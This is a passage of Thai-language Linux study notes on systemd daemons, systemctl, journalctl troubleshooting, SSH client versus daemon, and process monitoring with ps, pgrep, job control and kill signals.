pgrep -a sshd                   # ทางเลือกระดับ Pro: ใช้ pgrep หา PID และชื่อคำสั่งโดยตรง ไม่ต้องต่อท่อ grep

# ส่องแผนผังต้นไม้ลำดับชั้น Process Tree (มองเห็น Systemd เป็นรากเหง้า PID 1 แตกกิ่งก้านสู่ Daemons)
pstree                          # แสดงโครงสร้างต้นไม้ความสัมพันธ์ของทุก Process (Parent-Child)
pstree -p                       # แสดงแผนผังต้นไม้พร้อมกำกับเลข PID (พิสูจน์เชิงประจักษ์ว่า systemd คือ PID 1)
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
หัวใจของ Module นี้คือการเข้าใจ **"สถาปัตยกรรมของ Daemons และการควบคุม Background Services"** บน Linux:
1. **Daemons คืออะไร (เบื้องหลังของ Background Processes):**
   - Daemons คือโปรแกรมหรือ Process ที่รันอยู่เบื้องหลังอย่างต่อเนื่อง (Background Processes) โดยตัดขาดจากหน้าจอของผู้ใช้ (ไม่มี Controlling Terminal / TTY) เพื่อคอยดักฟังคำร้องขอ (Listen) หรือประมวลผลงานในระบบตลอดเวลา เช่น Web Server (`apache2`), Remote Access (`sshd`), หรือตัวจัดการแพ็กเกจ (`snapd`)
   - สัญลักษณ์สังเกตง่ายๆ ตามธรรมเนียม UNIX คือชื่อโปรแกรมมักจะลงท้ายด้วยตัว `d` เสมอ (เช่น `systemd`, `sshd`, `cron/crond`)
2. **สถาปัตยกรรม Systemd (Boot Chain & "Boss of the Daemons"):**
   - **ลำดับขั้นการบูต (Boot Chain):** เมื่อเปิดเครื่อง `Boot ➔ Kernel ➔ Systemd` โดยตัว Linux Kernel จะโหลดตัวเองขึ้นมาในหน่วยความจำ แล้วสั่งรัน `systemd` เป็นโปรเซสแรกสุดของระบบ (PID 1)
   - **บทบาท Initialization System ("init") & Master Daemon:** Systemd ได้รับสมญาว่าเป็น "Boss of the Daemons" (นายใหญ่คุมภูตรับใช้ทุกตัว) เพราะทันทีที่มันถูกเคอร์เนลเรียกขึ้นมา มันจะรับภาระสำคัญ 2 ประการทันที:
     1. **Mounting File System:** ตระเตรียมและเชื่อมต่อระบบไฟล์ต่าง ๆ (Storage/Partitions) ให้ OS พร้อมอ่านเขียน
     2. **Starting All Services (กลไก Forking):** สั่งปลุก Daemons และเซอร์วิสพื้นฐานทั้งหมดของระบบ (Network, Logging, Display, SSH ฯลฯ) ขึ้นมาทำงาน โดยใช้วิธี **Forking** (การโคลนและแยกหน่อ Process ลูกออกมาจาก Systemd ให้รันอยู่เบื้องหลังอย่างอิสระ)
   - **Service Manager & `systemctl`:** ตัว Systemd เป็น Service Manager ที่รันอยู่หลังฉาก ส่วนแอดมินจะสั่งการผ่านอินเทอร์เฟซ CLI ที่ชื่อ **`systemctl`** (System Control) ซึ่งทำหน้าที่เป็นสะพานเชื่อมหรือ "รีโมตคอนโทรล" ส่งคำสั่ง Start, Stop, Restart, และ Enable เข้าไปหา Systemd โดยตรง
   - **การพิสูจน์ลำดับชั้นด้วย `pstree -p`:** คำสั่ง `pstree -p` จะวาดแผนผังต้นไม้ (Process Tree) ให้เห็นด้วยตาเปล่าว่า รากแก้วของทั้งระบบคือ `systemd(1)` ที่ทำหน้าที่ Fork แตกกิ่งก้านสาขาออกมาเป็น Daemons ทุกตัวในเครื่อง เป็นการตอกย้ำภาพ "Boss of the Daemons" อย่างแท้จริง
3. **สามเหลี่ยมการสังเกตการณ์ระบบ (Observability Triangle):**
   - **Service Layer (`systemctl status <service>`):** ตรวจสอบสถานะการจัดการว่า Active/Inactive และอ่าน PID เบื้องต้น
   - **Process Layer (`ps aux | grep [n]ame`):** ตรวจสอบความจริงระดับตารางเคอร์เนล (Process Table) ว่ามีตัวตนจริงใน RAM หรือไม่ ถือ PID อะไร และกิน CPU/Memory เท่าใด
   - **Telemetry / Logs Layer (`journalctl -u <service> -f`):** เฝ้าดูข้อความ Log เหตุการณ์และ Error แบบเรียลไทม์เพื่อใช้วิเคราะห์ปัญหาเชิงลึก

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. **ความเชื่อมโยงระหว่าง Service Management กับ Process Table (`systemctl` vs `ps`):**
   - `sudo systemctl status <service>`: ตรวจสอบสถานะระดับ High-level ผ่านตัวจัดการ Service (ดูว่า active หรือไม่, ถือ PID อะไร, กิน RAM เท่าใด และหากใส่ `sudo` จะดึง System Logs ล่าสุดท้ายคำสั่งมาให้วิเคราะห์ได้ครบถ้วนโดยไม่ถูกตัดทอนสิทธิ์)
   - `ps aux | grep <name>`: ส่องทะลวงลงไปที่ตาราง Process ของเคอร์เนลโดยตรง (ดูความจริงในหน่วยความจำว่า Binary ตัวนั้นกำลังรันอยู่จริงหรือไม่ ใช้ CPU/RAM เท่าไหร่ และใครเป็นเจ้าของ) เหมาะสำหรับตรวจสอบ Background Daemons หรือโปรแกรมทั่วไป เช่น Text Editor (`nano`) หรือสคริปต์ที่รันค้างไว้
2. **ความแตกต่างของไวยากรณ์ `ps aux` vs `ps -aux` (ทำไมขึ้นเตือน Warning):**
   - ในโลก UNIX คำสั่ง `ps` มี 2 สไตล์หลัก:
     - **BSD Style (ไม่มีขีด `-`):** `ps aux` (`a` = ทุกโปรเซสที่มี tty, `u` = แสดง User และรายละเอียดละเอียด, `x` = โปรเซสเบื้องหลังที่ไม่มี tty เช่น Daemons)
     - **System V Style (มีขีด `-`):** เช่น `ps -ef`
   - หากพิมพ์ `ps -aux` (มีขีด) ระบบ Linux จะขึ้นเตือน `Warning: bad ps syntax, perhaps a bogus '-'?` เพราะตามมาตรฐาน System V ตัว `-u` แปลว่าเลือกดูเฉพาะ User ที่ระบุ (ระบบจะนึกว่าเราขอดู User ชื่อ `x`) แม้เคอร์เนลยุคใหม่จะอนุโลมแปลงผลลัพธ์ให้ แต่แนวปฏิบัติสากลที่ถูกต้องคือพิมพ์ `ps aux` (ไม่มีขีด)
3. **กลไกเชิงลึก: ทำไม `grep [n]ano` ถึงตัดโปรเซสของตัวเองออกได้:**
   - **ปัญหาเดิม (`ps aux | grep nano`):** ขณะที่คำสั่งนี้ทำงาน ในระบบจะมี 2 โปรเซสเกิดขึ้นพร้อมกันคือ `nano file.txt` (โปรเซสเป้าหมาย) และ `grep nano` (โปรเซสคำสั่ง grep เอง) ซึ่งเนื่องจากในชื่อคำสั่งของ grep มีคำว่า `nano` อยู่ตรงๆ ตัว grep จึงค้นหาและแมตช์เจอตัวเอง ทำให้ผลลัพธ์แสดงบรรทัดคำสั่ง grep ติดมาด้วยเสมอ
   - **กลไกแก้ทางด้วย Regex Bracket (`[n]ano`):**
     - ในไวยากรณ์ Regular Expression สัญลักษณ์ก้ามปู `[n]` หมายถึง Character Class ที่แมตช์ตัวอักษร 'n' เพียงตัวเดียว ดังนั้น Regex `[n]ano` จึงมีความหมายในการค้นหาเท่ากับคำว่า `nano` ทำให้มันค้นเจอโปรเซสจริงอย่าง `nano file.txt` ได้สำเร็จ
     - ทว่าในตาราง Process ตัวคำสั่งของ grep เองกำลังรันด้วยสตริงข้อความว่า `grep [n]ano` ซึ่งในสตริงนี้**ไม่มีคำว่า nano ติดกันตรงๆ** (มีอักขระ `[` และ `]` คั่นอยู่) ตัวโปรเซส grep เองจึงไม่ตรงตามเงื่อนไข Regex ของตัวเอง และถูกคัดกรองทิ้งไปโดยอัตโนมัติ เหลือเฉพาะโปรเซสเป้าหมายจริง 100%
   - **สูตรลัดสากล (Universal Pattern) สำหรับค้นหาโปรแกรมอื่น:**
     - ใช้ก้ามปู `[ ]` ครอบตัวอักษรตัวแรกของชื่อ Process ใดก็ได้เสมอ:
       - ค้นหา SSH Daemon: `ps aux | grep [s]shd`
       - ค้นหา Sublime Text: `ps aux | grep [s]ubl` (หรือ `[s]ublime`)
       - ค้นหา Apache Web Server: `ps aux | grep [a]pache2`
       - ค้นหา Python Scripts: `ps aux | grep [p]ython`
   - **ทางเลือกระดับ Pro ด้วยคำสั่ง `pgrep`:**
     - คำสั่ง `pgrep -a <name>` (Process Grep) ถูกสร้างขึ้นมาเพื่อแก้ปัญหานี้โดยเฉพาะ โดยค้นหาเฉพาะชื่อโปรเซสใน Kernel โดยตรง ไม่มีการสร้างโปรเซส grep ซ้อนขึ้นมา จึงไม่ต้องใช้เทคนิค bracket หรือต่อท่อ pipe ให้ยุ่งยาก
4. **แนวคิด Systemd Units ("Units = Daemons" จริงหรือ?):**
   - **ทำไมคนถึงมักพูดว่า `Units = Daemons`:** เพราะในชีวิตประจำวัน 90% ของ Units ที่เราสั่งเปิด/ปิด/รีสตาร์ท คือ Unit ประเภท **`.service`** (เช่น `ssh.service`, `apache2.service`) ซึ่งก็คือตัวแทนของ Background Daemons นั่นเอง
   - **ความจริงเชิงสถาปัตยกรรม (Unit Types):** คำว่า "Unit" คือโครงสร้างออบเจกต์นามธรรมที่ Systemd ใช้จัดการทรัพยากรทุกอย่างใน OS โดยแบ่งประเภทตามนามสกุลไฟล์:
     - `.service`: Background Daemons และแอปพลิเคชัน (เช่น Web, SSH)
     - `.socket`: IPC หรือ Network Socket สำหรับปลุก Service เมื่อมีการติดต่อเข้ามา (เช่น `snapd.socket`)
     - `.target`: จุดเชื่อมโยงจัดกลุ่ม Units เพื่อกำหนดสถานะระบบ (เช่น `multi-user.target`, `graphical.target`)
     - `.timer`: งานที่รันตามเวลา (ทางเลือกสมัยใหม่แทน Cron Job เช่น `fstrim.timer`)
     - `.mount`: จุดเชื่อมต่อระบบไฟล์ (Filesystem Mount Points)
   - **ความเชื่อมโยงกับคำสั่ง:** จึงเป็นเหตุผลว่าทำไมเวลาตรวจสอบ Services เราจึงต้องระบุแฟล็ก `systemctl list-units --type=service` เพื่อกรองเอาเฉพาะ Unit ที่เป็น Daemons ออกมาจาก Units ประเภทอื่นในเครื่อง
5. **ทำไมคำสั่ง Service ถึงใช้ `ssh` แต่ใน Process Table ถึงเห็นเป็น `sshd`? (Distro Unit Names vs Kernel Process):**
   - **ความแตกต่างพื้นฐานระหว่าง `ssh` กับ `sshd` (Client vs Daemon):**
     - `ssh` คือ **Client Program** (`/usr/bin/ssh`): ใช้เมื่อเราเป็นฝ่ายริเริ่มเชื่อมต่อไปหาเครื่องเป้าหมาย (`ssh user@target`)
     - `sshd` คือ **Server Daemon** (`/usr/sbin/sshd`): ตัวอักษร `d` ต่อท้ายย่อมาจาก **Daemon** ทำหน้าที่เปิดพอร์ต 22 รันอยู่เบื้องหลังเพื่อดักฟัง (Listen) และรอรับการเชื่อมต่อจากภายนอก
   - **ความสับสนนี้เกิดจาก การตั้งชื่อ Unit File ของแต่ละค่าย Distro:**
     1. **ฝั่ง Debian / Ubuntu / Kali Linux:**
        - ผู้ดูแลแพ็กเกจเลือกตั้งชื่อไฟล์ Service แบบสั้นว่า `ssh.service` (ทำให้พิมพ์ `sudo systemctl status ssh`)
        - แต่ระบบก็สร้าง Symlink ชี้ `sshd.service ➔ ssh.service` เผื่อไว้ให้ด้วย ดังนั้นบน Kali จะพิมพ์ `systemctl status ssh` หรือ `sshd` จึงได้ผลลัพธ์เหมือนกันทุกประการ
     2. **ฝั่ง RedHat / CentOS / Fedora / Arch:**
        - ค่ายนี้ตั้งชื่อไฟล์ Service ตรงๆ ตามชื่อ Daemon เลยคือ `sshd.service`
     3. **ความจริงในหน่วยความจำ (Process Table):**
        - ไม่ว่า Distro ไหนจะตั้งชื่อ Service ว่าอะไร ไฟล์ Binary จริงที่ถูก Kernel โหลดขึ้นไปรันในแรมจะมีชื่อเดียวเสมอคือ `/usr/sbin/sshd`
        - ดังนั้นเวลาสั่ง `ps aux` หรือ `pgrep` จึงต้องค้นหาคำว่า `sshd` (เช่น `ps aux | grep [s]shd` หรือ `pgrep -a sshd`)
6. **กลไกการรีโหลด Service: ทำไมควรใช้ `reload-or-restart` (Zero-Downtime vs Hard Reset):**
   - **`restart` (Hard Reset):** สั่ง Kill Process เดิมทิ้งทันที แล้ว Spawn Process ขึ้นมาใหม่ทั้งหมด ข้อเสียร้ายแรงคือ **ตัดการเชื่อมต่อเดิมทิ้งทันที (Downtime)** หากกำลัง SSH ทำงานอยู่บน Remote Server การสั่ง restart ssh อาจทำให้เซสชันหลุดทันที
   - **`reload` (Graceful In-Memory Config Reload):** ส่งสัญญาณ (เช่น SIGHUP หรือผ่าน `ExecReload=`) สั่งให้ Daemon อ่านไฟล์คอนฟิกใหม่เข้าหน่วยความจำ **โดยไม่ตัดการเชื่อมต่อเดิมและไม่ฆ่า Process** แต่ข้อจำกัดคือต้องขึ้นอยู่กับว่า Service นั้นเขียนโค้ดรองรับการ Reload ไว้หรือไม่ (หาก Service ไม่รองรับ คำสั่งจะล้มเหลว)
   - **`reload-or-restart` (Tactical Standard):** คำสั่งลูกผสมที่ดีที่สุดและปลอดภัยที่สุด — Systemd จะตรวจสอบให้อัตโนมัติ: หาก Service นั้นรองรับ Reload มันจะโหลดคอนฟิกใหม่ให้แบบ Graceful โดยไม่ตัด Session แต่หาก Service นั้นไม่รองรับคำสั่ง Reload (หรือ Service ยังไม่ได้รันอยู่) มันจะสลับไปทำ Restart ให้แทนอย่างราบรื่น
7. **สามประสานคำสั่งส่องสถานะ: `status` vs `is-active` vs `is-enabled` (Human vs Script Automation):**
   - **`systemctl status <unit>` (Human View):** รายงานข้อมูลละเอียดยิบ (สถานะ, PID, Memory, Path ของ Unit file, CGroup และ Log ย้อนหลัง 10 บรรทัด) เหมาะสำหรับผู้ดูแลระบบนั่งอ่านเพื่อหาสาเหตุ Error แต่ไม่เหมาะสำหรับการเขียนโปรแกรมเช็ค
   - **`systemctl is-active <unit>` (Runtime Check):** ถามระบบว่า *"ณ วินาทีนี้ โปรเซสกำลังรันอยู่หรือไม่?"* คืนค่าคำเดียวสั้นๆ (`active` หรือ `inactive` / `failed`) พร้อมคืน Return Exit Code `0` เมื่อกำลังรัน เหมาะสำหรับใช้ใน Bash Script เช่น `if systemctl is-active --quiet ssh; then ...`
   - **`systemctl is-enabled <unit>` (Boot Config Check):** ถามระบบว่า *"Service นี้ถูกตั้งให้ทำงานอัตโนมัติตอนเปิดเครื่องหรือไม่?"* คืนค่าคำเดียว (`enabled` หรือ `disabled`) พร้อมคืน Exit Code `0` เมื่อ enabled
   - **สถานะซ้อนที่พบได้จริง:** Service สามารถอยู่ในสถานะ `is-enabled: enabled` (ตั้งให้เปิดตอนบูต) แต่ ณ ปัจจุบัน `is-active: inactive` (เพราะมีคนสั่งหยุดชั่วคราว) ทั้งสองคำสั่งจึงตอบคำถามคนละมิติกัน
8. **การตรวจค้น Systemd Units: `list-units` (RAM) vs `list-unit-files` (Disk) และความหมายของ Masked:**
   - **`list-units` ส่องหน่วยความจำ (RAM):** แสดงเฉพาะ Units ที่ถูกเคอร์เนลและ Systemd โหลดขึ้นมาใช้งานอยู่ ณ ตอนนี้ หากรันแบบไม่ระบุแฟล็กจะแสดงทั้ง Device, Mount, Socket, Target ท่วมหน้าจอ จึงควรใช้ชอร์ตแฟล็ก **`-t service`** (ย่อมาจาก `--type=service`) เพื่อกรองดูเฉพาะ Daemons หรือเพิ่ม `--state=failed` เพื่อตรวจหา Service ที่พัง
   - **`list-unit-files` ส่องฮาร์ดดิสก์ (Disk):** ส่องอ่านไฟล์คอนฟิกทั้งหมดที่ติดตั้งอยู่ในเครื่อง (`/lib/systemd/system/` และ `/etc/systemd/system/`) ต่อให้ Service นั้นจะปิดอยู่ (ไม่ปรากฏใน RAM) คำสั่งนี้ก็ยังหาเจอเสมอ การต่อท่อ `systemctl list-unit-files | grep <name>` จึงเป็นท่ามาตรฐานในการเช็คว่าในเครื่องมี Service นี้ติดตั้งอยู่หรือไม่และตั้งบูตไว้อย่างไร
   - **ถอดรหัสสถานะสำคัญบนดิสก์ (STATE):**
     - `enabled`: มี Symlink ชี้ไปยัง Boot Target (`multi-user.target.wants/`) รันอัตโนมัติตอนเปิดเครื่อง
     - `disabled`: ไม่มี Symlink ไม่รันตอนบูต แต่สั่ง `systemctl start` เองแบบแมนนวลได้
     - `static`: ไม่มีหัวข้อ `[Install]` ในไฟล์ Unit ไม่สามารถสั่ง enable เดี่ยวๆ ได้ (มักเป็น Service ย่อยที่ถูกเรียกโดยตัวอื่น)
     - `masked`: **ล็อกกุญแจตายถาวร** โดยทำ Symlink ชี้ไปที่ `/dev/null` — ป้องกันไม่ให้ใครสามารถ `start` หรือ `enable` ได้โดยสิ้นเชิง แม้จะมี Service อื่นพยายามเรียกใช้ (ใช้สำหรับปิดตายช่องโหว่ความปลอดภัย)
     - `alias`: เป็น Symlink ชื่อทางลัดที่ชี้ไปยัง Unit ตัวจริง (เช่น `sshd.service` ชี้ไปที่ `ssh.service`)
9. **กรณีศึกษาเชิงลึก: Nginx, การสืบสวนข้อผิดพลาดด้วย `journalctl -xe` และการแก้ Logging Daemon ค้าง:**
   - **Nginx คืออะไร:**
     - Nginx (อ่านว่า "Engine-X") คือ Web Server และ Reverse Proxy ประสิทธิภาพสูง ทำงานด้วยสถาปัตยกรรม Asynchronous Event-Driven (กินทรัพยากรน้อยและรองรับ Concurrent Connections มหาศาลเมื่อเทียบกับ Apache) นิยมใช้ทำ Web Hosting, API Gateway, Load Balancer และในโลก Offensive Security มักใช้เป็น C2 Redirector หรือโฮสต์ Phishing Landing Pages และมัลแวร์เพย์โหลด
   - **ปัญหาคลาสสิกเมื่อสั่ง `sudo systemctl start nginx` แล้วขึ้น Failed:**
     - เมื่อสั่งสตาร์ท Service แล้วล้มเหลว Systemd จะแจ้งเตือน: `Job for nginx.service failed because the control process exited with error code. See "systemctl status nginx.service" and "journalctl -xe" for details.`
     - **สาเหตุยอดฮิต:** Nginx จะพยายามเข้ายึดและเปิดพอร์ต **Port 80 (HTTP)** แต่หากในเครื่องมี Service อื่น (เช่น Apache2 หรือเว็บเซิร์ฟเวอร์ตัวอื่น) กำลังรันยึดพอร์ต 80 อยู่ก่อนแล้ว Nginx จะไม่สามารถผูกพอร์ตได้ (`bind() to 0.0.0.0:80 failed (98: Address already in use)`) ส่งผลให้โปรเซสปิดตัวลงทันที
   - **เครื่องมือสืบสวนด้วย `journalctl -xe`:**
     - แฟล็ก `-x` (`--catalog`): ดึงข้อความอธิบายเชิงลึกจากระบบแคตตาล็อกมาช่วยขยายความว่าปัญหาเกิดจากอะไร
     - แฟล็ก `-e` (`--pager-end`): กระโดดไปที่บรรทัดท้ายสุดของ Log ทันที ไม่ต้องเสียเวลาเลื่อนจากบรรทัดแรก
   - **Gotcha ซ้อน Gotcha: เมื่อ `journalctl -xe` ว่างเปล่า (No entries) และวิธีแก้:**
     - ในบางสถานการณ์ (เช่น สภาพแวดล้อม Lab VM หรือ Container) ตัว Daemon ที่ทำหน้าที่บันทึก Log คือ **`systemd-journald.service`** อาจเกิดอาการค้าง (Hung/Buffer Lock) ทำให้ไม่มี Log ใหม่ถูกบันทึก
     - **วิธีแก้ปัญหา:** ตัวจัดการ Log เองก็คือ **Daemon** เช่นกัน! สามารถปลุกมันใหม่ได้ด้วย **`sudo systemctl restart systemd-journald`**
     - **ขั้นตอนปฏิบัติจริง:**
       1. สั่งรีสตาร์ทตัวเก็บ Log: `sudo systemctl restart systemd-journald`
       2. สั่งทริกเกอร์ให้ Service พังซ้ำอีกครั้งเพื่อสร้าง Log ใหม่: `sudo systemctl start nginx`
       3. ส่องดูสาเหตุที่แท้จริง: `sudo journalctl -xe` (จะเห็นต้นตอทันทีว่า Port 80 ชนกับเซอร์วิสอื่น)
10. **คำสั่งยุคดั้งเดิม `service` vs `systemctl` (SysVinit Compatibility Wrapper):**
    - **ที่มาของความคุ้นเคย:** ก่อนที่โลก Linux จะเปลี่ยนมาใช้ Systemd ระบบเดิมเรียกว่า **SysVinit** ซึ่งใช้คำสั่ง `service <daemon> <action>` ในการควบคุม เช่น `sudo service ssh start` หรือเรียกสคริปต์ตรงๆ ผ่าน `/etc/init.d/ssh start`
    - **กลไกใน Linux ยุคใหม่:** บน Kali/Debian/Ubuntu ยุคปัจจุบัน คำสั่ง `service` ไม่ได้หายไปไหน แต่มันถูกแปลงเป็น **Compatibility Wrapper** (ตัวครอบแปลงคำสั่ง) เมื่อเราพิมพ์ `sudo service ssh start` ตัวระบบจะแอบแปลงคำสั่งเบื้องหลังแล้วส่งต่อไปรัน `systemctl start ssh.service` ให้เองโดยอัตโนมัติ
    - **ความต่างของไวยากรณ์ (Syntax Placement):**
      - SysVinit: `service <ชื่อเซอร์วิส> <คำสั่ง>` ➔ `sudo service ssh start`
      - Systemd: `systemctl <คำสั่ง> <ชื่อเซอร์วิส>` ➔ `sudo systemctl start ssh`
11. **เวิร์กโฟลว์ปฏิบัติการจริง: การรีโมต SSH จาก Host (Windows CMD) เข้ามายัง Guest VM (Kali Linux):**
    - **ฝั่งเครื่องเป้าหมาย (Kali VM - ฝั่งรับสาย / Daemon):**
      1. เปิดและตั้งค่าเซอร์วิส SSH ให้พร้อมทำงานเสมอ: `sudo systemctl enable --now ssh` (เปิดเดี๋ยวนี้และตั้งให้บูตขึ้นมาเองทุกครั้ง)
      2. เช็คหมายเลข IP Address ของเครื่อง VM: `ip a` (ส่องดูบรรทัด `inet` เช่น `192.168.1.105` หรือ Host-Only/Bridged IP)
    - **ฝั่งเครื่องควบคุม (Windows Host - ฝั่งโทรออก / Client):**
      1. เปิด Command Prompt หรือ PowerShell บน Windows แล้วพิมพ์: `ssh kali@<IP_ของ_KALI>`
      2. ใส่รหัสผ่านของ Kali (`kali`) จะสามารถหลุดเข้าไปคุมหน้าจอ Terminal ของ VM ได้ทันทีโดยไม่ต้องเปิดหน้าต่าง GUI ของ VirtualBox ทิ้งไว้ให้กินทรัพยากร
    - **ตอกย้ำภาพจำ Client vs Daemon:** ตัวอย่างนี้พิสูจน์ให้เห็นอย่างชัดเจนว่า **`ssh`** บน Windows คือ Client (คนโทรออก) และ **`sshd`** บน Kali คือ Daemon (คนรับสาย) อย่างแท้จริง

---

## Module 07: Process Monitoring & Signal Handling
- **Status:** ✅ Completed
- **Core Concept:** การส่องและควบคุม Process: เข้าใจ Process IDs (PID), ทรัพยากร CPU/RAM และการส่งสัญญาณฆ่า Process ด้วย Signals (`SIGTERM` vs `SIGKILL`)

### 📝 Key Notes & Mindset
- ทุก Process มี PID และ Parent PID (PPID) สื่อสารและควบคุมกันผ่าน **Signals** (เช่น `SIGINT 2`, `SIGTERM 15`, `SIGTSTP 20`, `SIGKILL 9`)
- การทำงานใน Terminal แบ่งเป็น **Foreground** (ยึดหน้าจอ) และ **Background** (รันหลังฉากด้วย `&` ควบคุมสลับสถานะด้วย `jobs`, `fg`, `bg`)
- Signal 15 (`SIGTERM`) คือคำขอให้ปิดตัวลงอย่างสุภาพ (Graceful) ส่วน Signal 9 (`SIGKILL`) คือคำสั่งประหารเด็ดขาดโดยเคอร์เนล 100% ปฏิเสธไม่ได้

### 💻 Essential Commands
```bash
# ส่อง Process เฉพาะของ Terminal เซสชันปัจจุบัน (Default TTY Scope)
ps                              # แสดงเฉพาะโปรเซสที่ผูกกับหน้าต่าง Terminal ปัจจุบัน (เช่น bash, ps)

# ส่อง Process ทั้งหมดของ User ที่ระบุ (System V Syntax)
ps -u <username>                # กรองดูทุกโปรเซสของ User คนใดคนหนึ่ง (เช่น ps -u kali หรือ ps -u root)
ps -u <username> | grep <name>  # กรองดูโปรเซสของ User แล้วค้นหาโปรแกรมเป้าหมาย (เช่น ps -u kali | grep firefox)

# ส่อง Process ทั้งหมดในระบบแบบละเอียดข้ามทุก User และ Daemons (BSD Style Snapshot)
ps aux
ps aux | grep apache

# ควบคุม Foreground และ Background (Job Control)
ping -c 100 8.8.8.8             # รัน Foreground (ยึดหน้าจอ) ยิง ICMP 100 ครั้ง (-c = count บน Linux ยิงไม่สิ้นสุดถ้าไม่จำกัด)
# [กด Ctrl + Z]                 # พักงานหน้าจอชั่วคราว (ส่งสัญญาณ SIGTSTP ขึ้นสถานะ [1]+ Stopped)
jobs                            # ดูรายการ Background Jobs ทั้งหมดใน Terminal เซสชันนี้ (แสดงสถานะ Stopped/Running)
jobs -l                         # ดูรายการ Background Jobs พร้อมแสดงหมายเลข PID
bg %1                           # สั่งให้ Job ลำดับที่ 1 (หรือ bg 1) รันต่อใน Background ทันทีโดยไม่ยึดหน้าจอ
fg %1                           # ดึง Job ลำดับที่ 1 กลับขึ้นมาหน้าจอ (Foreground) -> จึงจะสามารถกด Ctrl + C เพื่อฆ่าได้
kill %1                         # ทางเลือก: สั่งฆ่า Job ลำดับที่ 1 ใน Background โดยตรงโดยไม่ต้องดึงขึ้นมาหน้าจอ
ping -c 100 8.8.8.8 &           # รัน Background ตั้งแต่แรกด้วย & (ปล่อยคืน prompt ทันที คืนค่า [Job_ID] PID)

# ส่อง Process แบบ Interactive Live Monitor
top
htop

# ค้นหา PID ของ Process ตามชื่อ (Process Grep)
pgrep <name>                    # คืนค่าเฉพาะเลข PID เพียวๆ (เหมาะส่งต่อให้ Script หรือคำสั่งอื่น)
pgrep -l <name>                 # คืนค่า PID พร้อมชื่อกระบวนการสั้นๆ (List Name สำหรับมนุษย์ตรวจสอบ)
pgrep -a <name>                 # คืนค่า PID พร้อม Argument และ Command Line เต็มยศ

# แสดงรายการ Signals ทั้งหมดที่ระบบรองรับ (List Signals)
kill -l                         # แสดงรายชื่อและหมายเลข Signals ทั้งหมด 64 ตัวในระบบ
kill -l 9                       # ค้นหาชื่อสัญญาณจากหมายเลข (คืนค่า KILL)
kill -l KILL                    # ค้นหาหมายเลขสัญญาณจากชื่อ (คืนค่า 9)

# ส่งสัญญาณควบคุม Process ด้วย Signals ต่างๆ
kill -2 <PID>                   # ส่งสัญญาณ SIGINT (เทียบเท่าการกด Ctrl + C จากคีย์บอร์ดเพื่อสั่งหยุดโปรเซส)
kill -19 <PID>                  # ส่งสัญญาณ SIGSTOP (สั่งเคอร์เนลแช่แข็งโปรเซสทันที คล้าย Ctrl + Z แต่บังคับหยุด 100%)
kill -18 <PID>                  # ส่งสัญญาณ SIGCONT (ปลุกโปรเซสที่ถูกแช่แข็งให้กลับมาทำงานต่อ)

# ส่งสัญญาณปิด Process แบบสุภาพ (SIGTERM - ค่าเริ่มต้น / Signal 15)
kill <PID>                      # ส่งสัญญาณ 15 ขอให้โปรแกรมปิดตัวลงอย่างปลอดภัย (Graceful shutdown)
kill -15 <PID>                  # ระบุหมายเลข Signal 15 ตรงๆ (เทียบเท่า kill -SIGTERM <PID>)

# บังคับฆ่า Process ทันทีโดยไม่รอ (SIGKILL - Signal 9)
kill -9 <PID>                   # สั่งเคอร์เนลประหารชีวิตโปรเซสทันที ปฏิเสธไม่ได้ (เทียบเท่า kill -SIGKILL <PID>)
kill -9 $(pgrep sleep)          # คำนวณหา PID ของ sleep ทั้งหมดด้วย $() แล้วส่งไปบังคับฆ่าพร้อมกันในคำสั่งเดียว

# กวาดล้างและฆ่า Process พร้อมกันตามชื่อคำสั่ง (Mass Termination)
pkill -9 <pattern>                   # ฆ่าทุกโปรเซสที่ตรงกับ pattern พร้อมกันทันที (เช่น pkill -9 ping)
pkill -f "<script/args>"             # ท่าระดับ Pro: แฟล็ก -f กรองฆ่าเฉพาะชื่อสคริปต์/Argument (เช่น pkill -f "malicious_script.sh")
killall -9 <binary_name>             # สั่งฆ่าทุกโปรเซสที่รันด้วยชื่อไบนารีเป๊ะๆ (เช่น killall -9 python3)
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
1. **ขอบเขตการมองเห็นของคำสั่ง `ps` (Scope of Process Visibility):**
   - **ทำไมพิมพ์ `ps` เปล่าๆ แล้วไม่เห็นโปรแกรมที่เปิดอยู่ (เช่น Firefox):** คำสั่ง `ps` เดี่ยวๆ จะดึงเฉพาะโปรเซสที่สังกัดอยู่ใต้ Controlling Terminal (TTY) เซสชันปัจจุบันเท่านั้น (โดยทั่วไปจะเห็นแค่ `bash` กับตัวคำสั่ง `ps` เอง) โปรแกรม GUI หรือ Process ที่แตกหน่อไปรันเบื้องหลังจึงไม่ปรากฏ
   - **การเปิดมุมมองด้วย `ps -u <username>`:** เป็นการสั่งให้เคอร์เนลรายงานทุกโปรเซสที่ User นั้นเป็นเจ้าของข้ามทุก TTY ไม่ว่าจะเป็นโปรแกรมหน้าต่างกราฟิก (GUI) หรือแบ็กกราวด์โปรเซส ทำให้ค้นเจอโปรแกรมอย่าง Firefox ได้ทันที
2. **สถาปัตยกรรม Foreground vs Background (Job Control):**
   - **Foreground Process (งานหน้าฉาก):** โปรแกรมที่ยึด Terminal และ Input/Output (stdin/stdout) ไว้ ทำให้ผู้ใช้ไม่สามารถพิมพ์คำสั่งอื่นต่อได้จนกว่าโปรแกรมจะทำงานเสร็จ (เช่น การสั่ง `ping -c 100 8.8.8.8` ดื้อๆ)
   - **Background Process (งานหลังฉาก):** การสั่งรันโปรแกรมโดยต่อท้ายด้วยอักขระ **`&` (Ampersand)** ตัว Shell จะส่งโปรแกรมไปทำงานเบื้องหลังทันที พร้อมคืนหน้าต่างพร้อมท์ (Prompt) ให้เราพิมพ์คำสั่งอื่นต่อได้ทันที และรายงานหมายเลข `[Job_Number] PID`
   - **เวิร์กโฟลว์ปฏิบัติการจริง (Live Suspension & Resumption):**
     1. สั่งรันหน้าจอ: `ping -c 100 8.8.8.8` (หน้าจอถูกยึด ไม่สามารถพิมพ์คำสั่งอื่นได้)
     2. กดคีย์ลัด **`Ctrl + Z`** (ส่งสัญญาณ `SIGTSTP` แช่แข็ง Process ชั่วคราว): ระบบจะรายงาน `[1]+ Stopped` และคืน prompt ทันที
